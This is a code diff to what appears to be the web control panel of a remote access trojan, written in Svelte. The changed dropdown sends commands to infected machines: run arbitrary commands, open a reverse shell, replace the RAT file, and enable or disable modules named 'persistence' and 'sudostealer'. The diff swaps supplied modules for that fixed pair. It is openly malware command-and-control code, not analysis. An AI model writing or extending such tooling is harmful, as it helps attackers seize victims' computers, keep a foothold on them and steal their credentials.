@@ -3,12 +3,11 @@
   import type { MachineType } from "./types/MachineType";
   import type { OrderType } from "./types/OrderType";
 
-  let { order=$bindable(), selected_machines, machines, modules }:
+  let { order=$bindable(), selected_machines, machines}:
   {
     order: OrderType,
     selected_machines: Record<string, boolean>,
     machines: Record<string, MachineType>
-    modules: Record<string, string>
   } = $props();
 
   let code = $state(JSON.stringify(order.data, null, "\t"));
@@ -105,9 +104,9 @@
       <option value={opt_fmt({type:"run", code:"gnome-calculator -m advanced"})}>Run command</option>
       <option value={opt_fmt({type:"shell", host:"127.0.0.1", port:1234})}>Reverse shell</option>
       <option value={opt_fmt({type:"update", code:"REPLACE THE RAT FILE WITH THIS (DANGEROUS!!)"})}>Update RAT</option>
-      {#each Object.entries(modules) as [name, code] (name)}
-        <option value={opt_fmt({type:"install_module", name:name, code: code})}>Install {name}</option>
-        <option value={opt_fmt({type:"uninstall_module", name:name})}>Uninstall {name}</option>
+      {#each ["persistence", "sudostealer"] as name (name)}
+        <option value={opt_fmt({type:"enable_module", name})}>Enable {name}</option>
+        <option value={opt_fmt({type:"disable_module", name:name})}>Disable {name}</option>
       {/each}
     </select>
     <button onclick={async () => {
